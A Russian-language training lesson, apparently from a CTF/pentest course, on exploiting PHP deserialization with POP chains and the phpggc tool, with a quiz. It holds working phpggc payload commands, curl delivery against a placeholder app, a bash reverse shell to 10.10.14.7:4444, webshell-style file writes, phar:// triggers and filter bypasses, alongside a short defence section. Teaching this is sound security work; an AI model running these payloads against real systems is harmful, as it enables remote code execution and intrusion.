---
id: web-php-deser-chains
title: "PHP deserialization POP chains (phpggc)"
category: web
parent: web-deser-languages
difficulty: expert
order: 4
tags: [php, deserialization, phpggc, pop-chain, rce]
prerequisites: [web-deserialization]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 44
summary: "PHP-десериализация: магические методы, POP-цепочки, генерация phpggc и эксплуатация фреймворковых gadget'ов."
---
PHP-десериализация (`unserialize`) вызывает **магические методы** (`__wakeup`, `__destruct`, `__toString`, `__call`) у восстанавливаемых объектов. Комбинируя объекты так, чтобы их деструкторы и строковые методы вызывали друг друга, строят **POP chain** (Property-Oriented Programming), ведущую к RCE. Инструмент **phpggc** содержит готовые цепочки для популярных фреймворков (Laravel, Symfony, WordPress, Monolog, Guzzle, Doctrine, Yii, ThinkPHP, Drupal, Magento). Этот урок — про генерацию, доставку, phar-триггеры и ручную сборку цепочек, когда готовой нет.

Ключевая идея: `unserialize` сам по себе безобиден, пока не найдутся классы, чьи магические методы делают что-то опасное. Опасность появляется на стыке «недоверенный ввод → unserialize» и «в приложении загружены библиотеки с богатыми деструкторами». Именно поэтому десериализация — это класс уязвимостей, который почти никогда не находится автоматическими сканерами: он зависит от набора зависимостей конкретной сборки.

## Теория: магические методы как примитивы

Каждый магический метод — это «гаджет», который атакующий пытается превратить в звено цепочки. Таблица ниже — базовый словарь:

| Метод | Когда вызывается | Чем полезен атакующему |
|-------|------------------|------------------------|
| `__wakeup` | при `unserialize` | срабатывает сразу, можно инициализировать поля |
| `__destruct` | при уничтожении объекта (конец запроса) | классический старт цепочки, часто без условий |
| `__toString` | при приведении к строке | конкатенация/echo объекта вызывает метод |
| `__call` / `__callStatic` | вызов несуществующего метода | часто содержит `call_user_func` |
| `__get` / `__set` | доступ к несуществующему свойству | может читать/писать файлы |
| `__invoke` | вызов объекта как функции | `$obj()` внутри чужого кода |
| `__sleep` | при `serialize` | не в атаке, но помогает понять граф |
| `__isset` / `__unset` | `isset()`/`unset()` по несуществующему свойству | реже, но встречается |

POP chain разворачивается так: `unserialize($payload)` создаёт объект A → при завершении запроса вызывается `A::__destruct()` → он обращается к свойству `$a->prop`, которое тоже объект B → вызывается `B::__toString()` → внутри `B::__toString` делается `file_put_contents` с полями объекта → контролируемый путь и содержимое → запись webshell. Классы A, B берутся из **уже загруженных** библиотек фреймворка, поэтому цепочка жёстко привязана к набору и версиям зависимостей.

## Формат сериализации PHP: полный разбор

Понимание формата нужно, чтобы модифицировать payload и не сломать длину строк (PHP строго проверяет длины и падает при несоответствии).

```text
O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}
```

- `O:<len>:"ClassName":<numprops>:{<key><value>...}` — объект.
- `s:<len>:"string"` — строка; `i:<int>` — число; `d:<float>` — float; `b:<0|1>` — boolean; `N;` — null.
- `a:<n>:{<key><value>...}` — массив (ключи и значения чередуются).
- `r:<id>` — PHP reference; `R:<id>` — ссылка на уже созданный объект (используется для циклов и обхода фильтров).
- Приватные и защищённые свойства кодируются нулевыми байтами: `\0ClassName\0prop` (private) и `\0*\0prop` (protected). В URL нулевой байт передаётся как `%00`.

Разбор и сборка без phpggc:

```bash
# собрать сериализацию объекта
php -r 'echo serialize(new stdClass);'
# разобрать непонятный payload
php -r '$o=unserialize(file_get_contents("payload.txt")); var_dump($o);'
# сравнить длины строк вручную
php -r '$s="O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\";}"; var_dump(unserialize($s));'
```

Важно: если вы вручную меняете значение строки, обязательно пересчитайте её длину. `s:2:"id"` → если поставить `whoami`, нужно `s:6:"whoami"`.

## phpggc: полный справочник флагов

phpggc — это «метасплойт» для PHP-десериализации: набор готовых POP-цепочек и генератор payload'ов под нужную кодировку и контейнер.

| Флаг | Значение |
|------|----------|
| `-l` | список всех цепочек (можно с фильтром `-l Laravel`) |
| `-i <chain>` | информация о цепочке: вектор, версии, примитивы |
| `-u` | url-encode payload |
| `-b` | base64-encode payload |
| `-f` | fast-destruct (ускоряет срабатывание `__destruct`) |
| `-w` | добавить `__wakeup`-совместимость |
| `-p phar` | обернуть в phar-контейнер |
| `-o file` | записать результат в файл |
| `-s` | использовать PHP `serialize` строки вместо сериализованного объекта |
| `--test` | локально проверить, что цепочка отрабатывает |
| `-t` | (в некоторых версиях) тестовый режим |
| `-a` | ASCII-safe / другие тонкие настройки |

Базовое использование:

```bash
# все цепочки, отфильтрованные по фреймворку
./phpggc -l Symfony
# информация о конкретной цепочке и поддерживаемых версиях
./phpggc -i Symfony/RCE4
# сгенерировать payload, который выполнит id
./phpggc Symfony/RCE4 system id
# то же, но url-encoded для параметра
./phpggc -u Symfony/RCE4 system id
# base64 для cookie
./phpggc -b Laravel/RCE2 system id
# phar-контейнер
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
# проверить локально против своей версии фреймворка
./phpggc --test Laravel/RCE9
```

## Каталог цепочек по фреймворкам

Популярные семейства и их назначение:

| Цепочка | Что даёт | Примечание |
|---------|----------|------------|
| `Monolog/RCE1-7` | RCE через `Monolog` | Monolog есть почти везде |
| `Laravel/RCE1-15` | RCE через Illuminate | привязано к версии |
| `Symfony/RCE1-13` | RCE через компоненты | много вариантов |
| `Guzzle/FW1` | запись файла | без RCE, но webshell |
| `Doctrine/FW1` | запись файла | Doctrine в Laravel/Symfony |
| `WordPress/*` | RCE/запись | плагины CMS |
| `Slim/RCE1` | RCE | микросервисы |
| `Yii/RCE1`, `ThinkPHP/RCE*` | RCE | азиатские фреймворки |
| `SwiftMailer/FW1` | запись файла | mail-компонент |
| `Phalcon/RCE1` | RCE | редко |
| `Drupal/*`, `Magento/*` | RCE | CMS/e-commerce |

Правило выбора: сначала определите фреймворк и версию, потом берите самую «высокую» цепочку с пометкой совместимости (`-i` показывает диапазоны версий), и обязательно проверяйте локально (`--test`).

## Разобранный пример 1: unserialize cookie → RCE

Цель: `Cookie: user=<base64(serialize(obj))>`, десериализуется без проверки класса.

Шаг 1 — определяем фреймворк. Признаки: `X-Powered-By`, `Set-Cookie` с `laravel_session`/`symfony`, `_sf2_attributes`, `/wp-content/`, характерные 500-е страницы.

Шаг 2 — генерируем payload:

```bash
./phpggc -b Laravel/RCE2 system "id"
```

Шаг 3 — отправляем:

```bash
curl -s "https://app.example/" -H "Cookie: user=$(./phpggc -b Laravel/RCE2 system id)"
```

Шаг 4 — вывод часто OOB: деструктор срабатывает в конце запроса и не возвращает stdout. Поэтому используем reverse shell или запись файла:

```bash
./phpggc -b Laravel/RCE2 system 'bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"'
```

Либо безусловный маркер, чтобы доказать RCE без интерактива:

```bash
./phpggc -b Laravel/RCE2 system 'id > /var/www/html/proof.txt'
curl -s https://app.example/proof.txt
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Разобранный пример 2: phar:// deserialization

Даже без явного `unserialize` PHP автоматически десериализует **phar-метаданные** при обращении к `phar://` — в том числе через файловые функции (`file_exists`, `getimagesize`, `file_get_contents`, `is_file`, `stat`, `exif_read_data`). Это огромная поверхность: LFI/upload + любая файловая функция с управляемым путём → RCE.

Шаг 1 — генерируем phar с payload:

```bash
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```

Шаг 2 — загружаем файл (если есть upload) или используем существующий; расширение неважно — важен контент phar. Часто достаточно замаскировать под `.jpg`, если проверяется только mime.

Шаг 3 — триггерим через `phar://`:

```bash
curl -s "https://app.example/?file=phar://uploads/exploit.phar/test"
```

Шаг 4 — метаданные десериализуются → цепочка → RCE. Требование: валидный phar stub/структура (phpggc это делает) и то, что PHP < 8.0 по умолчанию; с 8.0 phar-обёртка в некоторых функциях требует явного включения (`phar.readonly`, `phar.require_hash`).

## Разобранный пример 3: ручная POP chain из исходников

Когда готовой цепочки нет, ищите магические методы в исходниках и стройте цепочку вручную:

```bash
grep -rn "__wakeup\|__destruct\|__toString\|__call" src/ vendor/ --include='*.php'
```

Схема: находите `__destruct`, который вызывает метод свойства-объекта; в этом классе ищете `__call`/`__toString`, ведущий к `call_user_func`/`system`. Собираете сериализованный граф объектов через `php -r`:

```bash
php -r '
class A { public $b; function __destruct(){ $this->b->run(); } }
class B { public $cmd; function run(){ system($this->cmd); } }
$a=new A; $a->b=new B; $a->b->cmd="id";
echo serialize($a);'
```

Проверяете локально (`php -r 'unserialize(...)'`), затем доставляете. Такой подход часто нужен на CTF, где версия фреймворка нестандартная.

## Разобранный пример 4: session deserialization

PHP-сессии сериализуются своим обработчиком (`session.serialize_handler` = `php`, `php_binary`, `php_serialize`). Если атакующий может записать в сессию произвольную строку (например, через имя пользователя), он может «склеить» свою сериализацию с данными сессии и добиться инъекции объекта.

```bash
# php_serialize: значение вида |s:...  -> конкатенация строки и объекта
# php (legacy): формат key|serialized
# заражение: username = '|O:8:"stdClass":0:{}'
```

Комбинируется с LFI, где файл сессии читается/инклюдится, и с контролем над частью содержимого сессии.

## Где искать точки входа

- `unserialize($_COOKIE[...])` / `$_GET` / `$_POST` / `$_REQUEST`.
- Фреймворковые сессии и кеш (часто сериализованы: Laravel, Symfony, Yii).
- `phar://` в файловых функциях (LFI, avatar, обработка изображений, ZIP).
- Очереди/кеш (Redis, Memcached, Beanstalk) с PHP-объектами.
- `__wakeup`/`__destruct`-цепочки в плагинах CMS (WordPress, Joomla, Drupal).
- Поля `data=`, `token=`, `session=`, `state=`, `payload=`, `__PHP_Incomplete_Class`.

## Как определить фреймворк и версию

```bash
# заголовки и cookie
curl -sI https://app.example/ | grep -iE 'x-powered-by|set-cookie|server'
# раскрытие версии через ошибку/дебаг
curl -s "https://app.example/?x[]=1"
# composer.json/lock при утечке исходников
curl -s https://app.example/composer.json
```

Точная версия критична: `phpggc -i <chain>` печатает диапазон версий, в которых цепочка работает. Если версия вне диапазона — ищите другую цепочку или стройте вручную.

## Защита и её обход

Правильно: `unserialize($x, ['allowed_classes' => false])` или явный список разрешённых классов; для phar — запрет `phar://`-обёртки в файловых функциях; не хранить объекты в недоверенных cookie; подписывать сериализованные данные (HMAC).

Обходы: если разрешены «безобидные» классы, но у одного есть опасный `__wakeup` — цепочка всё равно возможна; фильтр по подстроке `O:` обходится через `C:` (класс, реализующий `Serializable`) и ссылки `R:`; проверка только по началу строки обходится префиксом; «экранирование кавычек» не спасает, потому что длина строки в payload управляется атакующим.

## Частые ошибки

- **Отправить цепочку без нужной библиотеки.** `Fatal error: Class not found`.
- **Забыть про версию фреймворка.** Цепочка привязана к версиям зависимостей.
- **Игнорировать phar.** Огромная поверхность без явного `unserialize`.
- **Ждать stdout.** Деструкторы не возвращают вывод — используйте OOB/reverse shell/файл-маркер.
- **Путать base64/urlencode.** phpggc `-b`/`-u`; неверная кодировка — payload не парсится.
- **Не проверять `allowed_classes`.** PHP 7+ умеет `unserialize($x,['allowed_classes'=>false])` — тогда вектор закрыт.
- **Сломать длины строк.** Ручная правка payload без пересчёта длины даёт `false`.
- **Ломать прод.** RCE — только с письменного согласия.

## Смежные техники

- **PHP object injection** — базовая инъекция объекта без цепочки (видно по `O:` в параметре).
- **phar deser** — авто-десериализация (см. `web-php-tricks`, `web-php-wrappers`).
- **Session deserialization** — подделка сессии PHP.
- **Composer autoload** — какие библиотеки доступны для цепочки.
- **Yii/ThinkPHP/Laravel gadget-цепочки** — отдельные семейства.
- **Upload + phar** — загрузка «картинки» и триггер через `getimagesize`.

## Что делать дальше / решение

1. Видите `O:`/`a:` в параметре или base64 → это PHP-сериализация; ищите `unserialize`.
2. Определили фреймворк и версию → подберите цепочку phpggc (`-l <Framework>`, `-i <chain>`).
3. Цепочка не отрабатывает → проверьте версию (`--test`), попробуйте `-f`/`-w`, другую цепочку.
4. Есть LFI/upload → попробуйте **phar://**-триггер даже без `unserialize`.
5. RCE подтверждён → **устойчивый** канал (reverse shell/webshell) + **read-back** доказательство.
6. Тупик → переходите к поиску ручной цепочки по исходникам или к смежному вектору.

## Справочная таблица

| Признак в трафике | Вероятная точка | Что делать |
|-------------------|-----------------|------------|
| `O:4:"User"` в cookie | PHP unserialize | определить класс, найти цепочку |
| base64 с `Tz`/`YT` в начале | сериализованный объект | декодировать, разобрать `php -r` |
| `phar://` в параметре file | phar deser | подсунуть свой phar |
| `laravel_session` | Laravel | `phpggc Laravel/RCE*` |
| `_sf2_attributes` | Symfony | `phpggc Symfony/RCE*` |
| `wordpress_logged_in` | WordPress | `phpggc WordPress/*` |
| `php_serialize` в session | session injection | склейка строки и объекта |

## Квиз

```quiz
- question: "Какой магический метод вызывается при unserialize?"
  options:
    - "__construct"
    - "__wakeup"
    - "__toString"
    - "__get"
  answer: 1
  explanation: "__wakeup срабатывает при восстановлении."
- question: "Какой инструмент генерирует PHP deser-цепочки?"
  options:
    - "ysoserial"
    - "phpggc"
    - "sqlmap"
    - "nmap"
  answer: 1
  explanation: "PHPGGC — готовые POP chains."
- question: "Чем опасен phar://?"
  options:
    - "Он медленный"
    - "PHP авто-десериализует метаданные phar при файловых операциях"
    - "Он шифрует"
    - "Он кеширует"
  answer: 1
  explanation: "Триггерится даже без явного unserialize."
- question: "Почему деструктор не показывает вывод?"
  options:
    - "Он шифрует"
    - "Он не возвращает stdout — нужен OOB"
    - "Он медленный"
    - "Он в другом потоке"
  answer: 1
  explanation: "RCE через reverse shell/DNS."
- question: "Что нужно для работы POP chain?"
  options:
    - "Только PHP"
    - "Классы цепочки должны быть загружены (библиотеки фреймворка)"
    - "TLS"
    - "Cookie"
  answer: 1
  explanation: "Иначе класс не найден."
```

## Где пригодится

- **CTF (Web):** задачи на PHP object injection.
- **Bug bounty:** deser RCE — критичный отчёт.
- **Пентест:** аудит PHP-приложений/фреймворков.
- **Работа (AppSec):** `allowed_classes`, отказ от unserialize ввода, обновление фреймворков.
